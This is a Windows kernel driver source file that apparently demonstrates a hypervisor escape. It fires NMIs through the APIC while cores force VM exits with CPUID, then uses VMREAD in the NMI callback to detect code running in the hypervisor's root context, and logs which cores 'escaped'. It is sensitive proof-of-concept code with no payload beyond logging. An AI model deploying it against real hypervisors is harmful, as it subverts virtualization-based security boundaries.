#define _AMD64_
#include <ntddk.h>
#include <intrin.h>

#define X2_MSR_BASE 0x800
#define ICROffset 0x300
#define TO_X2( x ) ( x / 0x10 )

PVOID NMICallbackHandle = nullptr;
PVOID threadhandle = nullptr;
int escaped = 0;
void(*TriggerNMI)(UINT32, UINT32) = nullptr;
void *apicBase = nullptr;

BOOLEAN NMICallback(PVOID context, BOOLEAN handled)
{
	size_t vmcslink = 0;
	__try {
		if (!__vmx_vmread(0x00002800, &vmcslink)) {
			if (vmcslink != 0)
				_InterlockedOr((volatile LONG *)&escaped, (1 << KeGetCurrentProcessorIndex()));
		}
	}
	__except (1) {
	}
	return TRUE;
}

void XTriggerNMI(UINT32 low, UINT32 high)
{
	*(UINT32 *)((uintptr_t)apicBase + ICROffset + 0x10) = high;
	*(UINT32 *)((uintptr_t)apicBase + ICROffset) = low;
}

void X2TriggerNMI(UINT32 low, UINT32 high)
{
	__writemsr(X2_MSR_BASE + TO_X2(ICROffset), ((UINT64)high << 32) | low);
}

INT32 InitializeAPIC(void)
{
	UINT64 apicBaseMSR = __readmsr(0x1B);
	if (!(apicBaseMSR & (1 << 11)))
		return STATUS_FAILED_DRIVER_ENTRY;
	if (apicBaseMSR & (1 << 10)) {
		TriggerNMI = X2TriggerNMI;
		return STATUS_FAILED_DRIVER_ENTRY;
	}
	else {
		PHYSICAL_ADDRESS paAPICBase;
		paAPICBase.QuadPart = apicBaseMSR & 0xFFFFFF000;
		apicBase = MmMapIoSpace(paAPICBase, 0x1000, MmNonCached);
		if (!apicBase)
			return STATUS_FAILED_DRIVER_ENTRY;
		TriggerNMI = XTriggerNMI;
	}
	return STATUS_SUCCESS;
}
ULONG_PTR IPIHandler(ULONG_PTR context)
{
	if (escaped != (1 << KeNumberProcessors) - 2) {
		if (KeGetCurrentProcessorIndex() != 0) {
			int cpuid[4] = { };
			__cpuid(cpuid, 0);
		}
		else {
			TriggerNMI((4 << 8) | (1 << 14) | (3 << 18), 0);
		}
	}
	else {
		//really at this point we could just specifically interrupt core 0, but you can add that if you want
		if (KeGetCurrentProcessorIndex() == 0) {
			int cpuid[4] = { };
			__cpuid(cpuid, 0);
		}
		else {
			TriggerNMI((4 << 8) | (1 << 14) | (3 << 18), 0);
		}
	}
	return 0;
}

void kthread(void *)
{
	do {
		KeIpiGenericCall(IPIHandler, 0);
	} while (escaped != ((1 << KeNumberProcessors) - 1));
	PsTerminateSystemThread(0);
}

EXTERN_C void DriverUnload2(PDRIVER_OBJECT object)
{
	if (threadhandle) {
		void *obj = nullptr;
		if (NT_SUCCESS(ObReferenceObjectByHandle(threadhandle, THREAD_ALL_ACCESS, nullptr, KernelMode, &obj, nullptr))) {
			KeWaitForSingleObject(obj, Executive, KernelMode, FALSE, nullptr);
			ObDereferenceObject(obj);
			ZwClose(threadhandle);
		}
	}
	if (NMICallbackHandle) KeDeregisterNmiCallback(NMICallbackHandle);
	if (apicBase) MmUnmapIoSpace(apicBase, 0x1000);
	for (int i = 0; i < KeNumberProcessors; i++) {
		if (escaped & (1 << i))
			DbgPrint("Core %i escaped\n", i);
	}
	return;
}

EXTERN_C NTSTATUS DriverEntry10(PDRIVER_OBJECT object, PUNICODE_STRING path)
{
	object->DriverUnload = DriverUnload2;
	InitializeAPIC();
	NMICallbackHandle = KeRegisterNmiCallback(NMICallback, nullptr);
	if (!NMICallbackHandle)
		return STATUS_FAILED_DRIVER_ENTRY;
	return PsCreateSystemThread(&threadhandle, 0, 0, 0, 0, kthread, 0);
}